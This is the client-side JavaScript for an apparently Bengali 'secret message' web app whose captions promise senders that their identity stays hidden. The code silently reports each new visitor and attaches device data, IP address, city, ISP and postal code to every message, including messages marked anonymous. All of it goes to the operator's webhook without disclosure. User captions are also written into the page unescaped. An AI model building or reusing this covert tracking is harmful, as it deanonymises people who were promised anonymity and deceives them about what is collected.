// ===== CONFIG (Replace with your actual values) =====
const CONFIG = {
  WEBHOOK_URL: 'https://cithipathao.vercel.app/api/webhook',
  BOT_API_BASE: 'https://cithipathao.vercel.app/api/bot'
};

// ===== DEFAULT CAPTIONS =====
const DEFAULT_CAPTIONS = [
  '💌 "সরাসরি বলতে না পারা অনুভূতিগুলো লিখে রেখে যান… পরিচয় থাকবে গোপন।"',
  '🌸 "মনের গভীরে লুকিয়ে থাকা কথাগুলো এখানে নিরাপদে বলুন…"',
  '🔐 "আপনার অজানা অনুভূতির জন্য একটি নিরাপদ গোপন ঠিকানা।"',
  '💖 "যা কখনো কাউকে বলা হয়নি… আজ লিখে ফেলুন নির্ভয়ে।"',
  '✨ "নাম নয়, অনুভূতিই এখানে সবচেয়ে গুরুত্বপূর্ণ।"',
  '🕊️ "পরিচয় গোপন রেখে মনের সব কথা পাঠিয়ে দিন…"',
  '💭 "অব্যক্ত অনুভূতিগুলোর জন্য একটি নীরব চিঠির বাক্স।"',
  '🌷 "ভালোবাসা, অভিমান, অনুভূতি — সবকিছু লিখুন গোপনে।"',
  '📩 "আপনার হৃদয়ের অপ্রকাশিত গল্প এখানেই জমা রাখুন…"',
  '❤️ "কেউ জানবে না আপনি কে… শুধু পৌঁছে যাবে আপনার মনের কথা।"'
];

// ===== USER ID =====
function generateUserId() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let id = '';
  for (let i = 0; i < 4; i++) id += chars[Math.floor(Math.random() * chars.length)];
  return id;
}

function getUserId() {
  let uid = localStorage.getItem('secret_user_id');
  if (!uid) {
    uid = generateUserId();
    localStorage.setItem('secret_user_id', uid);
    sendNewUserAlert(uid);
  }
  return uid;
}

const USER_ID = getUserId();
document.getElementById('displayUserId').textContent = USER_ID;

// ===== NAVIGATION =====
function showPage(page) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
  document.getElementById('page-' + page).classList.add('active');
  event.currentTarget.classList.add('active');

  if (page === 'send-history') loadSendHistory();
  if (page === 'receive-history') loadReceiveHistory();
  if (page === 'captions') loadCaptions();
}

// ===== CAPTION SCROLL =====
function buildCaptionScroll() {
  const scroll = document.getElementById('captionScroll');
  const allCaptions = [...DEFAULT_CAPTIONS, ...getUserCaptions()];
  const doubled = [...allCaptions, ...allCaptions];
  scroll.innerHTML = doubled.map(c =>
    `<div class="caption-item" onclick="useCaptionInMsg(this.textContent)">${c}</div>`
  ).join('');
}

function useCaptionInMsg(text) {
  document.getElementById('msgText').value = text;
  updateCharCount();
  showPage('home');
}

buildCaptionScroll();

// ===== ANON TOGGLE =====
function toggleAnon() {
  const checked = document.getElementById('anonCheck').checked;
  const fields = document.querySelectorAll('#senderName, #senderPhone, #senderFB');
  fields.forEach(f => {
    f.disabled = checked;
    f.style.opacity = checked ? '0.4' : '1';
    if (checked) f.value = '';
  });
}

// ===== CHAR COUNT =====
const msgBox = document.getElementById('msgText');
msgBox.addEventListener('input', updateCharCount);
function updateCharCount() {
  const len = msgBox.value.length;
  document.getElementById('charCount').textContent = len;
  if (len > 1000) msgBox.value = msgBox.value.substring(0, 1000);
}

// ===== GET DEVICE INFO =====
async function getDeviceInfo() {
  const info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    cookiesEnabled: navigator.cookieEnabled,
    online: navigator.onLine,
    charging: null,
    chargeStatus: null,
    ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
    cores: navigator.hardwareConcurrency || 'Unknown'
  };

  // Battery
  try {
    const bat = await navigator.getBattery();
    info.charging = bat.charging ? '⚡ Charging' : '🔋 Not Charging';
    info.chargeStatus = `${Math.round(bat.level * 100)}%`;
  } catch(e) {}

  // IP + Location
  try {
    const r = await fetch('https://ipapi.co/json/');
    const d = await r.json();
    info.ip = d.ip;
    info.country = d.country_name;
    info.region = d.region;
    info.city = d.city;
    info.isp = d.org;
    info.postal = d.postal;
  } catch(e) {
    info.ip = 'Unknown';
  }

  return info;
}

// ===== SEND NEW USER ALERT =====
async function sendNewUserAlert(uid) {
  try {
    const dev = await getDeviceInfo();
    const now = new Date();
    await fetch(CONFIG.WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'new_user',
        userId: uid,
        timestamp: now.toISOString(),
        device: dev
      })
    });
  } catch(e) {}
}

// ===== SEND MESSAGE =====
async function sendMessage() {
  const msg = document.getElementById('msgText').value.trim();
  if (!msg) {
    alert('⚠️ মেসেজ বক্স খালি রাখা যাবে না!');
    return;
  }

  const anon = document.getElementById('anonCheck').checked;
  const name = anon ? 'Unknown User' : (document.getElementById('senderName').value.trim() || 'Anonymous');
  const phone = anon ? 'Hidden' : (document.getElementById('senderPhone').value.trim() || 'Not Provided');
  const fb = anon ? 'Hidden' : (document.getElementById('senderFB').value.trim() || 'Not Provided');

  const dev = await getDeviceInfo();
  const now = new Date();
  const msgData = {
    type: 'message',
    userId: USER_ID,
    name, phone, fb,
    anonymous: anon,
    message: msg,
    timestamp: now.toISOString(),
    device: dev
  };

  try {
    const btn = document.querySelector('.send-btn');
    btn.disabled = true;
    btn.textContent = '⏳ পাঠানো হচ্ছে...';

    const res = await fetch(CONFIG.WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(msgData)
    });

    if (res.ok) {
      // Save to send history
      saveSendHistory({ name, message: msg, timestamp: now.toISOString(), anon });
      document.getElementById('msgText').value = '';
      updateCharCount();

      // Show success popup
      document.getElementById('popupTime').textContent = `📅 ${formatDateTime(now)}`;
      document.getElementById('successPopup').style.display = 'flex';

      // Show notification popup after 1.5s
      setTimeout(() => {
        document.getElementById('successPopup').style.display = 'none';
        if (Notification.permission === 'default') {
          document.getElementById('notifPopup').style.display = 'flex';
        }
      }, 2500);
    } else {
      alert('❌ মেসেজ পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
    }
  } catch(e) {
    alert('❌ নেটওয়ার্ক সমস্যা! ইন্টারনেট সংযোগ চেক করুন।');
  } finally {
    const btn = document.querySelector('.send-btn');
    btn.disabled = false;
    btn.innerHTML = '<span class="send-icon">💌</span> মেসেজ পাঠান <span class="send-icon">✈️</span>';
  }
}

function closeSuccessPopup() {
  document.getElementById('successPopup').style.display = 'none';
}
function closeReplyPopup() {
  document.getElementById('replyPopup').style.display = 'none';
}
function closeNotifPopup() {
  document.getElementById('notifPopup').style.display = 'none';
}

// ===== NOTIFICATIONS =====
async function allowNotification() {
  closeNotifPopup();
  try {
    const perm = await Notification.requestPermission();
    if (perm === 'granted') {
      registerServiceWorker();
    }
  } catch(e) {}
}

async function registerServiceWorker() {
  if ('serviceWorker' in navigator) {
    try {
      const reg = await navigator.serviceWorker.register('/sw.js');
      console.log('SW registered');
    } catch(e) {}
  }
}

// ===== HISTORY =====
function saveSendHistory(item) {
  const key = 'send_history_' + USER_ID;
  const hist = JSON.parse(localStorage.getItem(key) || '[]');
  hist.unshift(item);
  if (hist.length > 50) hist.pop();
  localStorage.setItem(key, JSON.stringify(hist));
}

function saveReceiveHistory(item) {
  const key = 'recv_history_' + USER_ID;
  const hist = JSON.parse(localStorage.getItem(key) || '[]');
  // Avoid duplicate
  if (!hist.find(h => h.msgId === item.msgId)) {
    hist.unshift(item);
    if (hist.length > 50) hist.pop();
    localStorage.setItem(key, JSON.stringify(hist));
  }
}

function loadSendHistory() {
  const key = 'send_history_' + USER_ID;
  const hist = JSON.parse(localStorage.getItem(key) || '[]');
  const el = document.getElementById('sendHistoryList');
  if (!hist.length) {
    el.innerHTML = '<div class="empty-state">📭 এখনো কোনো মেসেজ পাঠানো হয়নি।</div>';
    return;
  }
  el.innerHTML = hist.map(h => `
    <div class="history-frame">
      <div class="hf-badge">${h.anon ? '🎭 Anonymous' : '👤 ' + h.name}</div>
      <div class="hf-time">📅 ${formatDateTime(new Date(h.timestamp))}</div>
      <div class="hf-msg">📤 ${escapeHTML(h.message)}</div>
    </div>
  `).join('');
}

function loadReceiveHistory() {
  const key = 'recv_history_' + USER_ID;
  const hist = JSON.parse(localStorage.getItem(key) || '[]');
  const el = document.getElementById('receiveHistoryList');
  if (!hist.length) {
    el.innerHTML = '<div class="empty-state">📭 এখনো কোনো রিপ্লাই আসেনি।</div>';
    return;
  }
  el.innerHTML = hist.map(h => `
    <div class="history-frame">
      <div class="hf-badge">💬 Admin Reply</div>
      <div class="hf-time">📅 ${formatDateTime(new Date(h.timestamp))}</div>
      <div class="hf-msg">❤️ ${escapeHTML(h.message)}</div>
    </div>
  `).join('');
}

// ===== CAPTIONS =====
function getUserCaptions() {
  return JSON.parse(localStorage.getItem('user_captions_' + USER_ID) || '[]');
}

function saveUserCaptions(caps) {
  localStorage.setItem('user_captions_' + USER_ID, JSON.stringify(caps));
}

function loadCaptions() {
  const userCaps = getUserCaptions();
  const el = document.getElementById('captionList');
  const all = [
    ...DEFAULT_CAPTIONS.map(c => ({ text: c, isDefault: true })),
    ...userCaps.map(c => ({ text: c, isDefault: false }))
  ];
  if (!all.length) {
    el.innerHTML = '<div class="empty-state">কোনো ক্যাপশন নেই।</div>';
    return;
  }
  el.innerHTML = all.map((c, i) => `
    <div class="caption-frame">
      <div class="cf-text">${escapeHTML(c.text)}</div>
      <div class="caption-frame-btns">
        <button class="cf-copy-btn" onclick="copyCaption(${i})">📋 কপি করুন</button>
        ${!c.isDefault ? `<button class="cf-delete-btn" onclick="deleteCaption(${i - DEFAULT_CAPTIONS.length})">🗑️ মুছুন</button>` : ''}
      </div>
    </div>
  `).join('');
}

function copyCaption(i) {
  const all = [...DEFAULT_CAPTIONS, ...getUserCaptions()];
  if (all[i]) {
    navigator.clipboard.writeText(all[i]).then(() => {
      alert('✅ ক্যাপশন কপি হয়েছে!');
    });
  }
}

function deleteCaption(i) {
  const caps = getUserCaptions();
  caps.splice(i, 1);
  saveUserCaptions(caps);
  loadCaptions();
}

async function addCaption() {
  const txt = document.getElementById('newCaptionText').value.trim();
  if (!txt) { alert('⚠️ ক্যাপশন লিখুন!'); return; }
  const caps = getUserCaptions();
  caps.push(txt);
  saveUserCaptions(caps);
  document.getElementById('newCaptionText').value = '';

  // Send to admin bot
  try {
    await fetch(CONFIG.WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'new_caption',
        userId: USER_ID,
        caption: txt,
        timestamp: new Date().toISOString()
      })
    });
  } catch(e) {}

  loadCaptions();
  alert('✅ ক্যাপশন সংরক্ষিত হয়েছে!');
}

// ===== UTILS =====
function formatDateTime(d) {
  const date = new Date(d);
  return date.toLocaleString('bn-BD', {
    year: 'numeric', month: 'long', day: 'numeric',
    hour: '2-digit', minute: '2-digit'
  });
}

function escapeHTML(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/\n/g, '<br>');
}

// ===== POLL FOR REPLIES =====
async function pollReplies() {
  try {
    const res = await fetch(`${CONFIG.BOT_API_BASE}?action=get_reply&userId=${USER_ID}`);
    if (res.ok) {
      const data = await res.json();
      if (data && data.message) {
        const seenKey = 'seen_reply_' + data.msgId;
        if (!localStorage.getItem(seenKey)) {
          localStorage.setItem(seenKey, '1');
          saveReceiveHistory(data);
          showReplyPopup(data);

          // Show push notification
          if (Notification.permission === 'granted') {
            new Notification('💌 নতুন রিপ্লাই এসেছে!', {
              body: data.message.substring(0, 80),
              icon: '/icon.png'
            });
          }
        }
      }
    }
  } catch(e) {}
}

function showReplyPopup(data) {
  document.getElementById('replyMsgContent').innerHTML = escapeHTML(data.message);
  document.getElementById('replyTime').textContent = `📅 ${formatDateTime(new Date(data.timestamp))}`;
  document.getElementById('replyPopup').style.display = 'flex';
}

// Poll every 30 seconds
setInterval(pollReplies, 30000);
pollReplies();

// ===== REGISTER SW ON LOAD =====
if ('serviceWorker' in navigator && Notification.permission === 'granted') {
  registerServiceWorker();
}
